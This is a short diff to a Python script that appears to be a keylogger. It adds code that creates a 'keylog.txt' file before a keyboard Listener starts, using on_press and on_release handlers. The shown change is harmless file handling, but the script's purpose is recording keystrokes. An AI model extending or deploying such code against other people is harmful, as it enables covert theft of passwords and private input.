@@ -22,6 +22,12 @@ def on_release(key):
 
 
 def logger():
+    try:
+        f = open("keylog.txt", 'r')
+        f.close()
+    except FileNotFoundError:
+        f = open("keylog.txt", 'w')
+        f.close()
     with Listener(on_press=on_press, on_release=on_release) as listener:
         listener.join()
 
